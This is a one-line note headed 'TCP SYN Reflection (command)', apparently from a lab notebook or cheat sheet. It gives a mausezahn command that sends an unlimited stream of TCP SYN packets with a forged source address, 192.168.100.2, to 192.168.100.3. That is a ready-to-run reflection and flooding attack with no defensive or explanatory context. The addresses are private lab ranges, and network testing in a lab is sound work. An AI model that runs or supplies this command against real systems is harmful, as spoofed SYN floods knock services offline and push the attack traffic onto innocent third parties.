# TCP SYN Reflection (command)
sudo mausezahn enp0s3 -A 192.168.100.2 -B 192.168.100.3 -t tcp "sp=80, dp=50001, flags=syn, win=8192" -c 0